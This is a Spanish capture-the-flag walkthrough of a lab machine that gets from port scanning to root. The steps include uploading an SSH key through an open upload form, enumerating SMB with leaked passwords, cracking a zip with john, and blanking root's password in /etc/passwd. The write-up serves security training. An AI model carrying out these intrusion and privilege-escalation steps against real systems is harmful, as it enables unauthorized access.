

# r00tles (NIVEL DIFÍCIL)

## 1. Escaneo de puertos y servicios:

```sh
sudo nmap -p- --open -sN -sV -vvv -n -Pn 172.17.0.2 -oX tcp_ports
```

```sh
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-14 20:48 -0500
NSE: Loaded 48 scripts for scanning.
Initiating ARP Ping Scan at 20:48
Scanning 172.18.0.2 [1 port]
Completed ARP Ping Scan at 20:48, 0.04s elapsed (1 total hosts)
Initiating NULL Scan at 20:48
Scanning 172.18.0.2 [65535 ports]
Completed NULL Scan at 20:48, 1.52s elapsed (65535 total ports)
Initiating Service scan at 20:48
Scanning 4 services on 172.18.0.2
Discovered open port 22/tcp on 172.18.0.2
Discovered open|filtered port 22/tcp on 172.18.0.2 is actually open
Discovered open port 80/tcp on 172.18.0.2
Discovered open|filtered port 80/tcp on 172.18.0.2 is actually open
Discovered open port 139/tcp on 172.18.0.2
Discovered open|filtered port 139/tcp on 172.18.0.2 is actually open
Discovered open port 445/tcp on 172.18.0.2
Discovered open|filtered port 445/tcp on 172.18.0.2 is actually open
Completed Service scan at 20:49, 11.02s elapsed (4 services on 1 host)
NSE: Script scanning 172.18.0.2.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:49
Completed NSE at 20:49, 0.02s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:49
Completed NSE at 20:49, 0.01s elapsed
Nmap scan report for 172.18.0.2
Host is up, received arp-response (0.0000020s latency).
Scanned at 2025-07-14 20:48:56 -05 for 13s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     REASON       VERSION
22/tcp  open  ssh         tcp-response OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        tcp-response Apache httpd 2.4.58 ((Ubuntu))
139/tcp open  netbios-ssn tcp-response Samba smbd 4
445/tcp open  netbios-ssn tcp-response Samba smbd 4
MAC Address: 02:4A:F6:DB:6E:6A (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.81 seconds
           Raw packets sent: 65540 (2.622MB) | Rcvd: 65532 (2.621MB)

```

## 2. Escaneo específico del puerto 80

```sh
 nmap -p80 -sCV 172.18.0.2 -oN targeted
```

```sh
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-14 20:51 -0500
Nmap scan report for 172.18.0.2
Host is up (0.000017s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Subir Archivo
|_http-server-header: Apache/2.4.58 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
```

## 3. Buscar rutas y archivos con gobuster:

1. Tener instaladas las seclist para poder hacer el análisis

   ```sh
   yay -S seclists
   ```

2. Reaalizar el análisis con Gobuster:

   ```sh
   gobuster dir -u http://172.18.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt,bak -o resultados.txt
   ```

   ```sh
   ===============================================================
   Gobuster v3.7
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     http://172.18.0.2
   [+] Method:                  GET
   [+] Threads:                 50
   [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
   [+] Negative Status codes:   404
   [+] User Agent:              gobuster/3.7
   [+] Extensions:              php,txt,bak
   [+] Timeout:                 10s
   ===============================================================
   Starting gobuster in directory enumeration mode
   ===============================================================
   /upload.php           (Status: 200) [Size: 56]
   /readme.txt           (Status: 200) [Size: 78]
   /server-status        (Status: 403) [Size: 275]
   Progress: 882228 / 882228 (100.00%)
   ===============================================================
   Finished
   ===============================================================
   ```

   Obtuvimos un readme.txt

## 4. Vemos el contenido del readme.txt.

```sh
curl http://172.18.0.2/readme.txt
```

```sh
It may be that the file that is being uploaded is being uploaded in a .ssh/?
```

## 5. Creamos una clave ssh

```sh
[juan@archlinux r00tless]$ ssh-keygen -t rsa -b 2048 -f id_rsa
Generating public/private rsa key pair.
Enter passphrase for "id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:nwpG1hqPb94Ty0ob6sZS6/SpSAmGrWDgxgGkbpDEZyw juan@archlinux
The key's randomart image is:
+---[RSA 2048]----+
|+o.              |
|+E +             |
|=.+              |
|*o.    .         |
|oB+   + S        |
|=o . +.= ...     |
|.   oo*.+.oo     |
|   ..++*.*+      |
|    .==+O...     |
+----[SHA256]-----+
```

## 6. Submos la clave ssh al servidor

1. Damos permiso a la clave

   ```sh
   chmod 600 id_rsa
   ```

2. Subimos la clave al servidor

   ```sh
   curl -F "file=@id_rsa" http://172.18.0.2/upload.php
   ```

   ```sh
   Tipo MIME detectado: text/plain<br>Nombre del archivo subido: id_rsa<br>Archivo subido correctamente.
   ```

3. Nos conectamos por ssh usando la clave:

   ```sh
   ssh passsamba@172.18.0.2 -i id_rsa
   ```

   ```sh
   Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.1.4-arch1-1 x86_64)
   
    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/pro
   
   This system has been minimized by removing packages and content that are
   not required on a system that users do not log into.
   
   To restore this content, you can run the 'unminimize' command.
   Last login: Tue Aug 27 14:20:29 2024 from 172.17.0.1
   passsamba@6c10737ffcc3:~$ 
   ```

## 8. Explorar contenido de la máquina

1. ¿En qué shell estamos?

   ```sh
   ps -p $$
   ```

   ```sh
   PID TTY          TIME CMD
   277 pts/0    00:00:00 bash
   ```

2. ¿En qué SO estamos?

   ```sh
   uname -a
   ```

   ```sh
   Linux 6c10737ffcc3 6.1.4-arch1-1 #1 SMP PREEMPT_DYNAMIC Sat, 07 Jan 2023 15:10:07 +0000 x86_64 x86_64 x86_64 GNU/Linux
   passsamba@6c10737ffcc3:~$ cat /etc/os-release
   PRETTY_NAME="Ubuntu 24.04 LTS"
   NAME="Ubuntu"
   VERSION_ID="24.04"
   VERSION="24.04 LTS (Noble Numbat)"
   VERSION_CODENAME=noble
   ID=ubuntu
   ID_LIKE=debian
   HOME_URL="https://www.ubuntu.com/"
   SUPPORT_URL="https://help.ubuntu.com/"
   BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
   PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
   UBUNTU_CODENAME=noble
   LOGO=ubuntu-logo
   ```

3. ¿Qué directorios hay y con qué permisos?

   ```sh
   ls -la
   ```

   ```sh
   total 44
   drwxr-xr-x 1 passsamba passsamba 4096 Aug 27  2024 .
   drwxr-xr-x 1 root      root      4096 Aug 27  2024 ..
   -rw------- 1 passsamba passsamba    5 Aug 27  2024 .bash_history
   -rw-r--r-- 1 passsamba passsamba  220 Aug 27  2024 .bash_logout
   -rw-r--r-- 1 passsamba passsamba 3771 Aug 27  2024 .bashrc
   drwx------ 2 passsamba passsamba 4096 Aug 27  2024 .cache
   -rw-r--r-- 1 passsamba passsamba  807 Aug 27  2024 .profile
   drwxrws--- 1 passsamba passsamba 4096 Jul 15 05:31 .ssh
   -rw-r--r-- 1 root      root        47 Aug 27  2024 note.txt
   ```

4. Leemos el "note.txt"

   ```sh
   cat note.txt
   
   What would "sambaarribasiempre" be used for?
   ```

## 9. Intentamos usar la contraseña que nos provee el archivo

1. Crear un entorno virtual para correr smbmap y buscar con la contraseña "sambaarribasiempre"

   ```sh
   mkdir -p ~/tools/smbmap_env && cd ~/tools/smbmap_env
   python3.13 -m venv venv
   source venv/bin/activate
   pip install termcolor impacket flask ldap3
   git clone https://github.com/ShawnDEvans/smbmap.git
   cd smbmap
   python smbmap/smbmap.py -u "sambauser" -p "sambaarribasiempre" -d workgroup -H 172.18.0.2
   ```

   ```sh
   /home/juan/tools/smbmap_env/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
     import pkg_resources
   
       ________  ___      ___  _______   ___      ___       __         _______
      /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
     (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
      \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
       __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
      /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
     (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
   -----------------------------------------------------------------------------
   SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                        https://github.com/ShawnDEvans/smbmap
   
   [*] Detected 1 hosts serving SMB
   [*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                             
                                                                                                                                   
   [+] IP: 172.18.0.2:445	Name: 172.18.0.2          	Status: NULL Session
   	Disk                                                  	Permissions	Comment
   	----                                                  	-----------	-------
   	print$                                            	READ ONLY	Printer Drivers
   	read_only_share                                   	READ ONLY	
   	IPC$                                              	NO ACCESS	IPC Service (6c10737ffcc3 server (Samba, Ubuntu))
   [*] Closed 1 connections                                                                
   ```

3. Nos conectamos al recurso read_only_share con smbclient

   ```sh
   smbclient //172.18.0.2/read_only_share -U sambauser -W workgroup
   ```

   ```sh
   Can't load /etc/samba/smb.conf - run testparm to debug it
   Password for [WORKGROUP\sambauser]:
   Try "help" to get a list of possible commands.
   smb: \> 
   ```

4. Exploramos los recursos

   ```sh
   ls
   ```

   ```sh
     .                                   D        0  Tue Aug 27 04:21:22 2024
     ..                                  D        0  Tue Aug 27 04:21:22 2024
     secret.zip                          N      242  Tue Aug 27 04:21:14 2024
   
   		486489272 blocks of size 1024. 422160180 blocks available
   ```

5. Nos traemos el recurso secret.zip

   ```sh
   get secret.zip
   ```

   ```sh
   getting file \secret.zip of size 242 as secret.zip (2420000.0 KiloBytes/sec) (average inf KiloBytes/sec)
   ```

6. **Salimos de smb: \> y descomprimimos en secret.zip**

   Primero exit para volver al usaurio

   ```sh
   exit
   ```

   usamos zip2jhon para extraer la clave

   ```sh
   zip2john secret.zip > hash.txt
   ```

   Nos descargamos las claves rockyou.txt para descimprimir el .zip ya que nos pedirá contraseña

   ```sh
   wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
   ```

   Luego usamos el rockyou.txt para averiguar la clave del zip

   ```sh
   john hash.txt --wordlist=rockyou.txt
   ```

   ```sh
   Using default input encoding: UTF-8
   Loaded 1 password hash (PKZIP [32/64])
   No password hashes left to crack (see FAQ)
   ```

   Vemos la contraseña

   ```sh
   john hash.txt --wordlist=rockyou.txt
   ```

   ```sh
   Using default input encoding: UTF-8
   Loaded 1 password hash (PKZIP [32/64])
   No password hashes left to crack (see FAQ)
   (venv) [juan@archlinux smbmap]$ john --show hash.txt
   secret.zip/secret.txt:qwert:secret.txt:secret.zip::secret.zip
   
   1 password hash cracked, 0 left
   ```

   La contraseña es qwert

   ```sh
   unzip secret.zip
   ```

   ```sh
   Archive:  secret.zip
   [secret.zip] secret.txt password: 
    extracting: secret.txt  
   ```

   Vemos el txt

   ```sh
   cat secret.txt 
   ```

   ```sh
   root-false:cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ==
   ```

   Interpretamos la contraseña

   ```sh
   echo "cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ==" | base64 -d
   ```

   ```sh
   passwordbadsecureultra
   ```

## 10. Accedemos por ssh a una terminal con el usuario y contraseña encontrados (Entramos a root-false@172.18.0.2)

```sh
ssh root-false@172.18.0.2
```

Contraseña:

```sh
passwordbadsecureultra
```

### **Nos deja en la terminal:**

1. Exploramos los directorios y permisos

   ```sh
   root-false@6c10737ffcc3:~$ ls -la
   ```

   ```sh
   total 36
   drwxr-x--- 3 root-false root-false 4096 Aug 27  2024 .
   drwxr-xr-x 1 root       root       4096 Aug 27  2024 ..
   -rw------- 1 root-false root-false    5 Aug 27  2024 .bash_history
   -rw-r--r-- 1 root-false root-false  220 Aug 27  2024 .bash_logout
   -rw-r--r-- 1 root-false root-false 3771 Aug 27  2024 .bashrc
   drwx------ 2 root-false root-false 4096 Aug 27  2024 .cache
   -rw-r--r-- 1 root-false root-false  807 Aug 27  2024 .profile
   -rw-r--r-- 1 root       root         85 Aug 27  2024 message.txt
   
   ```

2. Revisamos el message.txt

   ```sh
   cat message.txt
   ```

   ```sh
   Mario, remember this word, then the boss will get angry:
   
   "pinguinodemarioelmejor"
   ```

3. Exploramos /etc/apache2/sites-enabled ya que este directorio contiene enlaces simbólicos a los archivos de configuración reales 

   ```sh
   cat /etc/apache2/sites-enabled/second-site.conf
   ```

   ```sh
   <VirtualHost 10.10.11.5:80>
       ServerName 10.10.11.5
       ServerAdmin webmaster@localhost
       DocumentRoot /var/www/second-site
   
       <Directory /var/www/second-site>
           Options Indexes FollowSymLinks
           AllowOverride None
           Require all granted
       </Directory>
   
       ErrorLog ${APACHE_LOG_DIR}/error.log
       CustomLog ${APACHE_LOG_DIR}/access.log combined
   </VirtualHost>
   ```

4. Nos conectamos con el usuario y contraseña que encontramos anterioremente.

   ```sh
   curl -vvv -d 'username=mario&password=pinguinodemarioelmejor' http://10.10.11.5
   ```

   ```sh
   *   Trying 10.10.11.5:80...
   * Connected to 10.10.11.5 (10.10.11.5) port 80
   > POST / HTTP/1.1
   > Host: 10.10.11.5
   > User-Agent: curl/8.5.0
   > Accept: */*
   > Content-Length: 46
   > Content-Type: application/x-www-form-urlencoded
   > 
   < HTTP/1.1 302 Found
   < Date: Tue, 15 Jul 2025 04:41:05 GMT
   < Server: Apache/2.4.58 (Ubuntu)
   < Location: super_secure_page/admin.php
   < Content-Length: 0
   < Content-Type: text/html; charset=UTF-8
   < 
   * Connection #0 to host 10.10.11.5 left intact
   ```

5. Vemos el archivo super_secure_page/admin.php

   ```sh
    curl -vvv http://10.10.11.5/super_secure_page/admin.php
   ```

   ```sh
   *   Trying 10.10.11.5:80...
   * Connected to 10.10.11.5 (10.10.11.5) port 80
   > GET /super_secure_page/admin.php/ HTTP/1.1
   > Host: 10.10.11.5
   > User-Agent: curl/8.5.0
   > Accept: */*
   > 
   < HTTP/1.1 200 OK
   < Date: Tue, 15 Jul 2025 04:43:19 GMT
   < Server: Apache/2.4.58 (Ubuntu)
   < Vary: Accept-Encoding
   < Content-Length: 4558
   < Content-Type: text/html; charset=UTF-8
   < 
   
   <!DOCTYPE html>
   <html lang="es">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Admin - Sistema de Administración</title>
       <style>
           body {
               background-color: #000;
               color: #0F0;
               font-family: 'Courier New', Courier, monospace;
               margin: 0;
               display: flex;
               flex-direction: column;
               align-items: center;
               justify-content: center;
               height: 100vh;
               overflow: hidden;
           }
           .container {
               background-color: #111;
               border: 2px solid #0F0;
               border-radius: 10px;
               padding: 30px;
               width: 80%;
               max-width: 1200px;
               box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
               overflow-y: auto;
               height: 80%;
           }
           h1 {
               margin-bottom: 20px;
               font-size: 2.5em;
               color: #0F0;
           }
           .stats, .charts, .news {
               margin-bottom: 20px;
           }
           .stats div, .charts div, .news div {
               background-color: #222;
               border: 1px solid #0F0;
               border-radius: 5px;
               padding: 15px;
               margin-bottom: 10px;
           }
           .stats h2, .charts h2, .news h2 {
               font-size: 1.5em;
               margin: 0;
               color: #0F0;
           }
           .stat-item, .chart-item, .news-item {
               margin: 10px 0;
           }
           .stat-value, .chart-value {
               font-size: 1.2em;
           }
           .news-item {
               font-size: 1em;
           }
           .footer {
               margin-top: 20px;
               font-size: 0.9em;
               color: #0F0;
           }
           .graph {
               width: 100%;
               height: 200px;
               background: linear-gradient(to right, #0F0 50%, #111 50%);
               border-radius: 5px;
           }
           .graph p {
               margin: 0;
               padding: 10px;
               text-align: center;
               font-size: 1.2em;
               color: #000;
               background-color: #0F0;
               border-radius: 0 0 5px 5px;
           }
       </style>
   </head>
   <body>
       <div class="container">
           <h1>Panel de Administración</h1>
           
           <!-- Estadísticas -->
           <div class="stats">
               <h2>Estadísticas del Sistema</h2>
               <div class="stat-item">
                   <span class="stat-value">Usuarios Activos: 42</span>
               </div>
               <div class="stat-item">
                   <span class="stat-value">Visitas Diarias: 1345</span>
               </div>
               <div class="stat-item">
                   <span class="stat-value">Errores Detectados: 7</span>
               </div>
           </div>
   
           <!-- Gráficos -->
           <div class="charts">
               <h2>Gráficos del Sistema</h2>
               <div class="chart-item">
                   <h3>Visitas del Mes</h3>
                   <div class="graph">
                       <p>1000 visitas</p>
                   </div>
               </div>
               <div class="chart-item">
                   <h3>Errores del Mes</h3>
                   <div class="graph">
                       <p>50 errores</p>
                   </div>
               </div>
           </div>
   
           <!-- Noticias/Actualizaciones -->												<!--ultramegatextosecret.txt-->
           <div class="news">
               <h2>Noticias y Actualizaciones</h2>
               <div class="news-item">
                   <strong>Actualización 1:</strong> Se ha implementado un nuevo sistema de monitoreo.
               </div>
               <div class="news-item">
                   <strong>Actualización 2:</strong> Se han corregido errores en el módulo de informes.
               </div>
               <div class="news-item">
                   <strong>Actualización 3:</strong> Nuevas funciones de seguridad agregadas.
               </div>
           </div>
       </div>
   
       <div class="footer">
           <p>© 2024 Sistema de Administración - Todos los derechos reservados</p>
       </div>
   </body>
   </html>
   * Connection #0 to host 10.10.11.5 left intact
   ```

6. Vemos el texto que nos indica en los comentarios de la página:

   ```sh
   curl http://10.10.11.5/ultramegatextosecret.txt
   ```

   ```sh
   En el reino de los hongos, se encontraba un lugar mágico y poco conocido: el Bosque de Nieve Eterna. Este bosque estaba cubierto de un manto blanco y brillante todo el año, y albergaba muchas criaturas fantásticas y secretos ocultos. Entre ellos, había una leyenda que hablaba de un pingüino muy especial que guardaba un gran secreto.
   
   El pingüino en cuestión no era un pingüino común. Se llamaba Pinguino y era el guardián de un antiguo artefacto mágico conocido como el Cristal de la Aurora. Según la leyenda, el Cristal tenía el poder de controlar el clima y podía traer tanto la eterna primavera como un invierno sin fin, dependiendo de la voluntad de su portador.
   
   Una tarde, mientras Mario exploraba el Bosque de Nieve Eterna, llegó a un claro donde vio a Pinguino deslizarse alegremente por una pista de hielo. Mario, siempre curioso, se acercó al pingüino y le preguntó sobre el cristal.
   
   Pinguino, con una mirada sabia en sus ojos, le dijo a Mario que el Cristal de la Aurora estaba escondido en una cueva secreta bajo el lago helado del bosque. Sin embargo, solo el corazón puro y valiente de un verdadero héroe podría encontrarlo. La entrada a la cueva estaba oculta por una mágica capa de hielo que solo se derretía cuando alguien con buenas intenciones realizaba un acto de bondad.
   
   Mario decidió aceptar el desafío. Durante su travesía, ayudó a los habitantes del bosque: rescató a un grupo de conejos atrapados en una tormenta de nieve, reparó una antigua fuente que había sido dañada por un deshielo imprevisto y, sobre todo, demostró su valentía enfrentando a una banda de Koopa Troopas que habían estado causando estragos en la región.
   
   Al realizar estos actos de bondad, el hielo sobre el lago comenzó a derretirse, revelando una entrada oculta en la cueva. Mario entró con cuidado y, con la guía de Pinguino, encontró el Cristal de la Aurora brillando en su pedestal.
   
   El pingüino le explicó que el cristal no solo tenía el poder de controlar el clima, sino que también representaba el equilibrio y la armonía entre las estaciones. Mario comprendió que era esencial mantener ese equilibrio para el bienestar de todo el reino.
   
   Con el Cristal_de_la_Aurora a salvo, Mario y Pinguino regresaron al claro del bosque. El pingüino le agradeció a Mario por su valentía y bondad, y le dijo que siempre podría contar con el bosque para cualquier futuro desafío.
   
   Desde ese día, Mario visitó el Bosque de Nieve Eterna cada vez que necesitaba un consejo sabio, y la leyenda del pingüino guardián del cristal se convirtió en una historia popular en el Reino de los Hongos, recordando a todos que la bondad y la valentía siempre encuentran su recompensa.
   
   by less
   ```

7. Contraseña: Cristal_de_la_Aurora , Usuario: less.

   ```sh
   su less
   ```

   ```sh
   less@6c10737ffcc3:/home/root-false$ 
   ```

## 11. En el usuario less exploramos los archivos

```sh
cat /etc/passwd
```

```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-network:x:997:997:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-resolve:x:995:995:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
sambauser:x:1001:1001:sambauser,,,:/home/sambauser:/bin/bash
root-false:x:1000:1000:root-false,,,:/home/root-false:/bin/bash
less:x:1002:1002:less,,,:/home/less:/bin/bash
passsamba:x:1003:1003:passsamba,,,:/home/passsamba:/bin/bash
```

### Quiero editar el archivo, y quitarle la x a root:

Por lo que modifico los permisos del archivo para poder editarlo con nano

```sh
sudo chown less:less /etc/passwd
```

```sh
nano /etc/passwd
```

Quito la "x", guardo y compruebo el cambio

```sh
cat /etc/passwd
```

```sh
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-network:x:997:997:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-resolve:x:995:995:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
sambauser:x:1001:1001:sambauser,,,:/home/sambauser:/bin/bash
root-false:x:1000:1000:root-false,,,:/home/root-false:/bin/bash
less:x:1002:1002:less,,,:/home/less:/bin/bash
passsamba:x:1003:1003:passsamba,,,:/home/passsamba:/bin/bash
```

### Ingresamos a la terminal como root!!

```sh
su -
```

```sh
root@6c10737ffcc3:~# 
```